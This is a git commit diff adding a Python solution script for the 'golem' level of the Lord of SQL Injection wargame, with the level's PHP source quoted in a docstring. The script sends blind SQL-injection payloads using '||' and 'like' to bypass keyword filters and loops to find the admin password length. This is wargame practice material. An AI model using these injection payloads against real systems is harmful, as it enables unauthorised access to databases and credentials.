2f54942fd8a02583da6cd43323e49873c1ca4eaa
Jeong Min Kim <dsaqaz421@naver.com>
2022-08-18 03:35:22 +0000

    Test: golem los test

--- Lord-Of-Sqlinjection/011golem.py
+++ Lord-Of-Sqlinjection/011golem.py
@@ -1,7 +1,40 @@
-
+'''
+<?php 
+  include "./config.php"; 
+  login_chk(); 
+  $db = dbconnect(); 
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
+  if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
+  $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
+  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
+  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
+  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
+   
+  $_GET[pw] = addslashes($_GET[pw]); 
+  $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
+  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
+  highlight_file(__FILE__); 
+?>
+'''
 import requests
 from urllib import parse
 
 host = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw="
 cookies = {"PHPSESSID" : "8s7khiq67rue3qlsffsskni093"}
+password_length = 0
 s = requests.Session()
+
+print("password length find start!!")
+for i in range(1, 100) :
+    
+    # ' || id like 'admin' %26%26 pw like '1%' -- -
+    # 이런식으로 접근해야할듯?>?
+    param = f"' || id like 'admin' && length(pw) = {i} -- -"
+    res = s.get(host + parse.quote(param), cookies=cookies)
+    if "Hello admin" in res.text :
+        print(f"password length is {i}")
+        password_length = i
+        break
+print("password length find end !!")
+
